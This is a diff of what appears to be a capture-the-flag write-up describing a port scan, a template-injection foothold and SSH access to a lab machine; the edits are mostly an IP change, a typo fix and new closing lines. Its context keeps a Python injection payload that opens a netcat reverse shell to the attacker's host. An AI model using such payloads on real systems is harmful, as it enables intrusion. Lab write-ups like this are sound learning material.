@@ -27,11 +27,11 @@ I was especially excited to get started on this challenge since it is focusd on 
 First we run a port scan on the box to see what services are running. 
 
 ```bash
-➜ sudo nmap -sS -A 10.129.181.93
+➜ sudo nmap -sS -A 10.10.11.164
 ```
 ```
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-24 22:37 EDT
-Nmap scan report for 10.129.181.93
+Nmap scan report for 10.10.11.164
 Host is up (0.0097s latency).
 Not shown: 997 closed tcp ports (reset)
 PORT     STATE    SERVICE VERSION
@@ -273,7 +273,7 @@ self.__init__.__globals__.__builtins__.__import__('os').system('nc 10.10.14.7 44
 
 ```
 
-Now on our attacking machine we want to prepare ourselfs to recieve the reverse shell that we just planted.
+Now on our attacking machine we want to prepare ourselves to recieve the reverse shell that we just planted.
 
 ```bash
 # nc or ncat if your on osx
@@ -457,6 +457,7 @@ curl \
 Finally, we'll try the key on the box
 
 ```bash
+# chmod 400 sshkey.pem
 ssh -i sshkey.pem dev01@10.10.11.164
 ```
 
@@ -470,7 +471,9 @@ Last step for the first flag is to `cat` the contents of the file.
 cat user.txt
 ```
 
-Wooooooo, we did it. Our first CTF.
+🍾 WOOOOOOO, we did it. Our first CTF flag (at least the user flag)
+
+Next steps is to escalate our access to `root` but we'll leave that for another day.
 
 # Summary
 
